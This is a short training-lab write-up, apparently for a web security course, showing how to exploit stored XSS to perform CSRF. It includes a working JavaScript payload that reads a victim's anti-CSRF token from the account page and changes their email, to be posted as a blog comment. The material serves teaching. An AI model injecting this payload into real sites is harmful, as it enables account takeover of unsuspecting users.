# Lab: Exploiting XSS to perform CSRF

Login and notice the "change email" link on the account page. Inspect it to see that a POST request must be issued to the `/my-account/change-email` path with an `email` parameter. There is also an anti-CSRF token in the input (token).

The exploit needs to load the user page, extract the token, and then use the token to change the email.

The following script can accomplish this:

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

Submit this as a blog post comment body to complete the lab.